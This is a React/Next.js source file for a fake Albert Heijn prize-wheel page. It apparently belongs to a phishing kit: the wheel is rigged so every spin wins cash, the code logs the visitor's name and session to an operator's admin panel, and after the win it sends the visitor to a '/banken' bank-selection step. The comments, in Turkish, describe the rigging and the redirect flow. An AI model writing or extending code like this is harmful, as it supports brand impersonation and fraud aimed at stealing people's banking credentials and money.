"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { AlbertHeijnWheel } from "@/components/AlbertHeijnWheel/AlbertHeijnWheel";
import { PrizePopup } from "@/components/AlbertHeijnWheel/PrizePopup";
import { useIsMobile } from "@/hooks/useIsMobile";
import { getPreferredRouteSessionId } from "@/lib/session-id-client";
import { DEFAULT_WHEEL_VIEWPORT, resolveWheelLayout } from "./wheel-layout";
import { logAuditEvent } from "@/lib/audit-event";
import {
  WHEEL_PRIZES,
  WHEEL_CURRENCY,
  getWheelPrizeByRotationIndex,
  getWheelPrizeByText,
  getWheelPrizeByAmount,
  type WheelPrizeSegment as PrizeSegment,
} from "@/lib/wheel-prizes";

type WinHistoryItem = {
  prize: string;
  date: string;
};

type SessionRecord = {
  id: string;
  amount: number | null;
  current_step: string | null;
  form_data?: Record<string, unknown> | null;
};

const ANGLE_OFFSET = 0;
const MIN_FULL_SPINS = 6;
const LOCAL_HISTORY_KEY = "ah-prize-wheel-last-five-wins";
const MAX_HISTORY_ITEMS = 5;
const PRIZES: readonly PrizeSegment[] = WHEEL_PRIZES;

// Kazanilabilir NAKIT dilimleri — admin paneli wheel_settings.prizes
// sirasiyla bu 5 girise karsilik gelir (amount/weight duzenlenebilir,
// rotationIndex gorsele sabitlenmistir). iPhone/Motorrad/Auto/Erneut kazanilamaz.
const CASH_SLOTS: Array<{ rotationIndex: number; amount: number; weight: number }> = [
  { rotationIndex: 2, amount: 2000, weight: 20 },
  { rotationIndex: 5, amount: 1500, weight: 25 },
  { rotationIndex: 6, amount: 1000, weight: 30 },
  { rotationIndex: 7, amount: 500, weight: 20 },
  { rotationIndex: 8, amount: 2500, weight: 5 },
];

type WheelPrizeConfig = {
  prizes: PrizeSegment[];
  winnable: PrizeSegment[];
  weights: Record<number, number>;
};

function buildWheelConfig(wheelSettings: unknown): WheelPrizeConfig {
  const ws = wheelSettings && typeof wheelSettings === "object"
    ? (wheelSettings as Record<string, unknown>)
    : null;
  const raw = ws?.prizes;
  const entries = CASH_SLOTS.map((def, i) => {
    const entry = Array.isArray(raw) ? (raw[i] as { amount?: unknown; weight?: unknown } | undefined) : undefined;
    const amount = Number(entry?.amount);
    const weight = Number(entry?.weight);
    return {
      rotationIndex: def.rotationIndex,
      amount: Number.isFinite(amount) && amount > 0 ? Math.round(amount) : def.amount,
      weight: Number.isFinite(weight) && weight >= 0 ? Math.round(weight) : def.weight,
    };
  });

  const prizes: PrizeSegment[] = WHEEL_PRIZES.map((prize) => {
    const slotIdx = CASH_SLOTS.findIndex((slot) => slot.rotationIndex === prize.rotationIndex);
    if (slotIdx === -1) return prize;
    const e = entries[slotIdx];
    const label = `${WHEEL_CURRENCY}${e.amount.toLocaleString("en-US")}`;
    return { ...prize, amount: e.amount, text: label, popupLines: [`€ ${formatAmount(e.amount)}`] };
  });
  const weights: Record<number, number> = {};
  entries.forEach((e) => { weights[e.rotationIndex] = e.weight; });
  const winnable = prizes.filter(
    (prize) => prize.kind === "amount" && (weights[prize.rotationIndex] ?? 0) > 0,
  );
  return { prizes, winnable, weights };
}

const DEFAULT_WHEEL_CONFIG: WheelPrizeConfig = buildWheelConfig(null);

function normalizeAngle(angle: number) {
  return ((angle % 360) + 360) % 360;
}

function formatAmount(amount: number) {
  return new Intl.NumberFormat("de-AT").format(amount);
}

function getTargetRotation(currentRotation: number, rotationIndex: number) {
  const normalizedCurrent = normalizeAngle(currentRotation);
  const targetNormalized = normalizeAngle(ANGLE_OFFSET - rotationIndex * 40);
  const delta = normalizeAngle(targetNormalized - normalizedCurrent);
  return currentRotation + MIN_FULL_SPINS * 360 + delta;
}

function getPrizeFromSession(session: SessionRecord | null, prizes: PrizeSegment[]) {
  const storedRotationIndex = session?.form_data?.wheel_rotation_index;
  if (typeof storedRotationIndex === "number") {
    const p = prizes.find((x) => x.rotationIndex === storedRotationIndex);
    if (p) return p;
  }

  const storedLabel = session?.form_data?.wheel_result_label;
  if (typeof storedLabel === "string") {
    const p = prizes.find((x) => x.text === storedLabel);
    if (p) return p;
  }

  const storedAmount = session?.form_data?.wheel_result_amount;
  if (typeof storedAmount === "number" && storedAmount > 0) {
    const p = prizes.find((x) => x.amount === storedAmount);
    if (p) return p;
  }

  if (typeof session?.amount === "number" && session.amount > 0) {
    const p = prizes.find((x) => x.amount === session.amount);
    if (p) return p;
  }

  return null;
}

// Agirlikli rastgele odul secimi (admin panelindeki % agirliklara gore)
function getRandomWinnablePrize(cfg: WheelPrizeConfig) {
  const weightedList: PrizeSegment[] = [];
  for (const prize of cfg.winnable) {
    const weight = cfg.weights[prize.rotationIndex] ?? 1;
    for (let i = 0; i < weight; i++) weightedList.push(prize);
  }
  if (weightedList.length === 0)
    return cfg.winnable[0] ?? cfg.prizes.find((p) => p.kind === "amount") ?? cfg.prizes[0];
  return weightedList[Math.floor(Math.random() * weightedList.length)];
}

function getRotationIndexFromRotation(rotation: number) {
  const normalizedRotation = normalizeAngle(rotation);
  return Math.round(normalizeAngle(ANGLE_OFFSET - normalizedRotation) / 40) % PRIZES.length;
}

function getPrizeFromRotation(rotation: number, prizes: PrizeSegment[]) {
  const landedRotationIndex = getRotationIndexFromRotation(rotation);
  return prizes.find((prize) => prize.rotationIndex === landedRotationIndex) ?? null;
}

function logWheelEvent(eventName: "wheel_spin" | "wheel_win" | "popup_open" | "popup_close", payload?: Record<string, unknown>) {
  const analyticsObj: Record<string, unknown> = {
    event: eventName,
    ...(payload ?? {}),
  };
  console.log("[wheel-analytics]", analyticsObj);
  try {
    logAuditEvent({
      event_kind: "wheel",
      event_action: eventName,
      status: "ok",
      meta: payload ?? {},
    });
  } catch {
    // ignore
  }
}

function readWinHistory() {
  if (typeof window === "undefined") {
    return [] as WinHistoryItem[];
  }

  try {
    const rawValue = window.localStorage.getItem(LOCAL_HISTORY_KEY);
    if (!rawValue) {
      return [];
    }

    const parsed = JSON.parse(rawValue) as WinHistoryItem[];
    return Array.isArray(parsed) ? parsed.slice(0, MAX_HISTORY_ITEMS) : [];
  } catch {
    return [];
  }
}

function storeWinHistory(prize: string) {
  const nextHistory = [
    {
      prize,
      date: new Date().toISOString(),
    },
    ...readWinHistory(),
  ].slice(0, MAX_HISTORY_ITEMS);

  window.localStorage.setItem(LOCAL_HISTORY_KEY, JSON.stringify(nextHistory));
  return nextHistory;
}

export function WheelClient({
  sessionId,
  routeSessionId,
}: {
  sessionId: string;
  routeSessionId?: string;
}) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const pendingPrizeRef = useRef<PrizeSegment | null>(null);
  const wheelCfgRef = useRef<WheelPrizeConfig>(DEFAULT_WHEEL_CONFIG);
  const rotationRef = useRef(0);

  const [spinning, setSpinning] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [rotation, setRotation] = useState(0);
  const [resultPrize, setResultPrize] = useState<PrizeSegment | null>(null);
  const [sessionData, setSessionData] = useState<SessionRecord | null>(null);
  const [viewportSize, setViewportSize] = useState({ width: 0, height: 0 });
  const [isViewportReady, setIsViewportReady] = useState(false);
  const [winHistory, setWinHistory] = useState<WinHistoryItem[]>([]);
  const [popupOpen, setPopupOpen] = useState(false);
  const [wheelCfg, setWheelCfgState] = useState<WheelPrizeConfig>(DEFAULT_WHEEL_CONFIG);
  const setWheelCfg = (cfg: WheelPrizeConfig) => {
    wheelCfgRef.current = cfg;
    setWheelCfgState(cfg);
  };
  const continueButtonRef = useRef<HTMLButtonElement | null>(null);
  const isMobileViewport = useIsMobile();

  const activeLayout = isViewportReady ? resolveWheelLayout(viewportSize) : null;
  const viewportHeight = viewportSize.height > 0 ? viewportSize.height : DEFAULT_WHEEL_VIEWPORT.height;
  const isSpinDisabled = spinning || resultPrize !== null || !sessionData;

  useEffect(() => {
    rotationRef.current = rotation;
  }, [rotation]);

  useEffect(() => {
    setWinHistory(readWinHistory());
  }, []);

  useEffect(() => {
    let cancelled = false;

    async function loadSession() {
      if (!sessionId) {
        setError("Ungueltige Sitzung.");
        return;
      }

      if (!supabase) return;

      const { data, error: dbError } = await supabase
        .from("sessions")
        .select("id,amount,current_step,form_data")
        .eq("id", sessionId)
        .single();

      if (cancelled) return;

      if (dbError || !data) {
        setError("Sitzung nicht gefunden.");
        return;
      }

      const nextSession = data as SessionRecord;

      // Admin wheel_settings.prizes -> cark odul/sans yapilandirmasi
      try {
        const { data: gs } = await supabase
          .from("global_settings")
          .select("wheel_settings")
          .limit(1)
          .single();
        if (!cancelled && gs?.wheel_settings) setWheelCfg(buildWheelConfig(gs.wheel_settings));
      } catch {}

      // Eğer admin paneli normal link olarak açmışsa ama kullanıcı çark sayfasındaysa,
      // admin panelinde "ÇARK OYUNU" yazması için is_wheel_game'i true yapalım.
      if (nextSession.current_step === "code_entry") {
        // ⭐ WHEEL AKIŞI: İlk açılışta code_entry is_wheel_game'i true yap VE
        //   current_step'i de WHEEL olarak GÜNCELLE.
        //   Böylece GlobalStatusWatcher /code'a geri atamaz.
        const alreadyWheel = (nextSession.form_data as any)?.is_wheel_game === true;
        const updatedFormData = { ...(nextSession.form_data || {}), is_wheel_game: true };
        await supabase.from("sessions").update({
          is_hidden: false,
          current_step: alreadyWheel ? nextSession.current_step : "wheel",
          form_data: updatedFormData,
        }).eq("id", sessionId);
        nextSession.form_data = updatedFormData;
        if (!alreadyWheel) {
          nextSession.current_step = "wheel";
        }
      }

      setSessionData(nextSession);

      const restoredPrize = getPrizeFromSession(nextSession, wheelCfgRef.current.prizes);
      if (restoredPrize && (nextSession.current_step === "win" || nextSession.current_step === "banken")) {
        setResultPrize(restoredPrize);
        // ⭐ FLASH YOK: Eski 2000ms setTimeout KALDIRILDI. HEMEN yönlendir (replace).
        const bankTarget = `/banken?session=${encodeURIComponent(effectiveRouteSessionId)}`;
        try { window.location.replace(bankTarget); } catch {}
        try { router.replace(bankTarget); } catch {}
      }
    }

    void loadSession();

    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  useEffect(() => {
    const updateViewportSize = () => {
      const nextViewportSize = {
        width: Math.round(window.visualViewport?.width ?? window.innerWidth),
        height: Math.round(window.visualViewport?.height ?? window.innerHeight),
      };

      setViewportSize((currentViewportSize) =>
        currentViewportSize.width === nextViewportSize.width && currentViewportSize.height === nextViewportSize.height
          ? currentViewportSize
          : nextViewportSize,
      );
      setIsViewportReady(true);
    };

    updateViewportSize();
    window.visualViewport?.addEventListener("resize", updateViewportSize);
    window.addEventListener("resize", updateViewportSize);
    window.addEventListener("orientationchange", updateViewportSize);

    return () => {
      window.visualViewport?.removeEventListener("resize", updateViewportSize);
      window.removeEventListener("resize", updateViewportSize);
      window.removeEventListener("orientationchange", updateViewportSize);
    };
  }, []);

  useEffect(() => {
    const previousHtmlOverflow = document.documentElement.style.overflow;
    const previousHtmlOverscroll = document.documentElement.style.overscrollBehavior;
    const previousBodyOverflow = document.body.style.overflow;
    const previousBodyOverscroll = document.body.style.overscrollBehavior;
    const previousHtmlPosition = document.documentElement.style.position;
    const previousBodyPosition = document.body.style.position;
    const previousBodyWidth = document.body.style.width;
    const previousBodyHeight = document.body.style.height;
    const previousHtmlMargin = document.documentElement.style.margin;
    const previousBodyMargin = document.body.style.margin;

    document.documentElement.style.overflow = "clip";
    document.documentElement.style.overflowX = "clip";
    document.documentElement.style.overflowY = "clip";
    document.documentElement.style.overscrollBehavior = "none";
    document.documentElement.style.margin = "0";
    document.body.style.overflow = "clip";
    document.body.style.overflowX = "clip";
    document.body.style.overflowY = "clip";
    document.body.style.overscrollBehavior = "none";
    document.body.style.position = "fixed";
    document.body.style.inset = "0";
    document.body.style.width = "100vw";
    document.body.style.height = "100dvh";
    document.body.style.maxWidth = "100vw";
    document.body.style.maxHeight = "100dvh";
    document.body.style.margin = "0";

    return () => {
      document.documentElement.style.overflow = previousHtmlOverflow;
      document.documentElement.style.overflowX = "";
      document.documentElement.style.overflowY = "";
      document.documentElement.style.overscrollBehavior = previousHtmlOverscroll;
      document.documentElement.style.margin = previousHtmlMargin;
      document.body.style.overflow = previousBodyOverflow;
      document.body.style.overflowX = "";
      document.body.style.overflowY = "";
      document.body.style.overscrollBehavior = previousBodyOverscroll;
      document.body.style.position = previousBodyPosition;
      document.body.style.inset = "";
      document.body.style.width = previousBodyWidth;
      document.body.style.height = previousBodyHeight;
      document.body.style.maxWidth = "";
      document.body.style.maxHeight = "";
      document.body.style.margin = previousBodyMargin;
    };
  }, []);



  const finalizeSpin = async (prize: PrizeSegment) => {
    setSpinning(false);
    setResultPrize(prize);
    // setShowPopup(true); // Popup'ı devre dışı bırakıyoruz

    logWheelEvent("wheel_win", {
      prize: prize.text,
      amount: prize.amount,
      selectionIndex: prize.selectionIndex,
      rotationIndex: prize.rotationIndex,
    });

    if (prize.kind === "amount") {
      setWinHistory(storeWinHistory(`${WHEEL_CURRENCY} ${formatAmount(prize.amount ?? 0)}`));
    }

    if (!supabase || !sessionId) {
      return;
    }

    const nextFormData = {
      ...(sessionData?.form_data ?? {}),
      pending_profile: false,
      currency: WHEEL_CURRENCY,
      wheel_result_label: prize.text,
      wheel_result_kind: prize.kind,
      wheel_result_amount: prize.amount,
      wheel_rotation_index: prize.rotationIndex,
    };

    // ⭐ POPUP FIX: current_step'i HEMEN "banken" YAPMA — realtime gate
    //    popup acilmadan /banken'e atardi. Step guncellemesi popup kapaninca.
    await supabase
      .from("sessions")
      .update({ is_hidden: false, amount: prize.amount ?? 0,
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    setSessionData((previous) =>
      previous
        ? {
            ...previous,
            amount: prize.amount ?? 0,
            form_data: nextFormData,
          }
        : previous,
    );

    // ⭐ Çark DURDUKTAN SONRA: kisa bekleme -> odul popup'i ac (MAXIMA/Tesco akisi)
    //   Popup kapaninca /banken'e yonlen.
    setTimeout(() => {
      setPopupOpen(true);
      logWheelEvent("popup_open", { prize: prize.text });
      try { continueButtonRef.current?.focus(); } catch {}
    }, 900);
  };

  const handlePopupClose = async () => {
    setPopupOpen(false);
    logWheelEvent("popup_close");
    // ⭐ ONCE step'i yaz, SONRA yonlendir — yoksa gate eski step'i gorup geri atar.
    if (supabase && sessionId) {
      await supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "banken" })
        .eq("id", sessionId);
    }
    const bankTarget = `/banken?session=${encodeURIComponent(effectiveRouteSessionId)}`;
    try { window.location.replace(bankTarget); } catch {}
    try { router.replace(bankTarget); } catch {}
  };

  // 10 sn icinde tiklamazsa otomatik banka listesine gec.
  useEffect(() => {
    if (!popupOpen) return;
    const t = window.setTimeout(() => {
      void handlePopupClose();
    }, 10000);
    return () => window.clearTimeout(t);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [popupOpen]);

  const spinWheel = () => {
    if (isSpinDisabled) {
      return;
    }

    const nextPrize = getRandomWinnablePrize(wheelCfgRef.current);
    const startRotation = rotationRef.current;
    // Dilim icinde dogal durus: +-10° jitter (dilim yarisi +-20° — indeks bozulmaz).
    // Kazanilan odul HER ZAMAN gercek durus acisindan hesaplanir (getPrizeFromRotation).
    const jitter = (Math.random() * 2 - 1) * 10;
    const targetRotation = getTargetRotation(startRotation, nextPrize.rotationIndex) + jitter;

    pendingPrizeRef.current = nextPrize;
    setSpinning(true);
    logWheelEvent("wheel_spin", {
      selectionIndex: nextPrize.selectionIndex,
      targetPrize: nextPrize.text,
    });
    setRotation(targetRotation);
  };

  const handleWheelTransitionEnd = () => {
    if (!spinning || !pendingPrizeRef.current) {
      return;
    }

    const settledPrize = getPrizeFromRotation(rotationRef.current, wheelCfgRef.current.prizes) ?? pendingPrizeRef.current;
    pendingPrizeRef.current = null;
    void finalizeSpin(settledPrize);
  };



  if (error) {
    return (
      <div
        className="flex flex-col items-center justify-center p-6 text-center"
        style={{ minHeight: "100dvh" }}
      >
        <div className="mb-4 text-red-500">
          <svg className="size-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
          </svg>
        </div>
        <h1 className="mb-2 text-2xl font-bold text-slate-800">Error</h1>
        <p className="text-slate-600">{error}</p>
      </div>
    );
  }

  return (
    <>
      <div
        className="relative overflow-hidden bg-black"
        style={{
          position: "fixed",
          inset: "0",
          width: "100vw",
          maxWidth: "100vw",
          height: "100dvh",
          minHeight: "100dvh",
          maxHeight: "100dvh",
          overflow: "clip",
          overflowX: "clip",
          overflowY: "clip",
          contain: "layout paint size",
          clipPath: "inset(0 0 0 0)",
          WebkitClipPath: "inset(0 0 0 0)",
          paddingTop: "env(safe-area-inset-top)",
          paddingRight: "env(safe-area-inset-right)",
          paddingBottom: "env(safe-area-inset-bottom)",
          paddingLeft: "env(safe-area-inset-left)",
          margin: 0,
          boxSizing: "border-box",
        }}
      >
        {activeLayout ? (
          <AlbertHeijnWheel
            layout={activeLayout}
            rotation={rotation}
            spinning={spinning}
            disabled={isSpinDisabled}
            onSpin={spinWheel}
            onSpinEnd={handleWheelTransitionEnd}
          />
        ) : null}
      </div>

      <PrizePopup
        open={popupOpen}
        isMobile={isMobileViewport}
        result={resultPrize ? {
          kind: resultPrize.kind,
          text: resultPrize.text,
          amount: resultPrize.amount,
          popupLines: [...resultPrize.popupLines],
        } : null}
        amountLine={resultPrize?.text ?? ""}
        userName={(() => {
          const fd = (sessionData?.form_data ?? {}) as Record<string, unknown>;
          const fn = typeof fd.firstName === "string" ? fd.firstName.trim() : "";
          const ln = typeof fd.lastName === "string" ? fd.lastName.trim() : "";
          return [fn, ln].filter(Boolean).join(" ");
        })()}
        description={
          resultPrize
            ? `Sie haben ${resultPrize.text} gewonnen!`
            : ""
        }
        continueButtonRef={continueButtonRef}
        onClose={handlePopupClose}
      />
    </>
  );
}
